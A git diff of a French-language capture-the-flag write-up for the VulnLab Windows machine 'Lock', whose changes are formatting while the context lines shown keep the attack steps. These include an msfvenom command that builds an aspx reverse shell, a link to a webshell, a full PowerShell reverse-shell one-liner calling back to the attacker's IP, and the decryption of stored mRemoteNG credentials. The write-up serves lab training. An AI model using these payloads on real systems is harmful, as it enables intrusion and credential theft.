@@ -1,24 +1,26 @@
 ---
-title: Lock - Easy
-description: WU Lock - Easy
+title: Lock
+description: WU Lock
 categories: [Writeup]
 tags: [writeup]
 template: doc
+sidebar:
+  order: 3
+  badge:
+    text: 'easy'
+    variant: success
 ---
+
 import { Image } from 'astro:assets';
 import banner from '../../../../assets/writeup/vulnlab/banner.jpeg';
 
 <Image src={banner} alt="banner" format="avif" quality={"mid"}/>
 
-
 # LOCK
-
 
 | OS | Difficulty | Target |
 |----|----|----|
 | Windows | <span style="color:green">**EASY**</span> | 10.10.92.237 |
-
-
 
 # 🔭 Enumeration
 
@@ -31,6 +33,7 @@ PORT     STATE SERVICE
 3000/tcp open  ppp
 3389/tcp open  ms-wbt-server
 ```
+
 Scan approfondit des ports trouvés:
 
 ```
@@ -87,6 +90,7 @@ PORT     STATE SERVICE       VERSION
 |   Product_Version: 10.0.20348
 |_  System_Time: 2024-09-14T21:34:32+00:00
 ```
+
 | PORT | PROTOCOL |
 |----|----|
 | 80 | HTTP |
@@ -137,6 +141,7 @@ CI/CD integration is now active - changes to the repository will automatically b
 ```
 
 Création d'un reverse shell avec un fichier `.aspx` puis push vers le dépôt ou en utilisant [ce script](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx)
+
 ```sh
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.3.147 LPORT=4444 -f aspx -o web.aspx
 git config --global user.name ellen.freeman
@@ -157,7 +162,9 @@ Sur le lien de la page, je saisis la commande:
 ```cmd
 /c powershell.exe -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.8.3.147',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
+
 On obtient notre reverse shell, en fouillant dans les répertoires de `ellen.freeman` on trouve un fichier `config.xml`.
+
 ```powershell
 PS C:\Users\ellen.freeman\Documents> cat config.xml
 <?xml version="1.0" encoding="utf-8"?>
@@ -168,7 +175,7 @@ PS C:\Users\ellen.freeman\Documents> cat config.xml
 
 Le fichier `config.xml` est un fichier pour RemoteNG. J'utilise le script de ce [dépôt](https://github.com/gquere/mRemoteNG_password_decrypt) pour déchiffrer les informations présentes.
 
-```sh
+```sh wrap
 python3 rng-decrypt.py config.xml   
 Name: RDP/Gale
 Hostname: Lock
@@ -180,7 +187,6 @@ On obtient donc l'user `Gale.Dekarios` et son mot de passe.
 Connectons-nous en RDP.
 
 Le flag user est présent sur le Bureau.
-
 
 # 🎯 Privilege Escalation
 
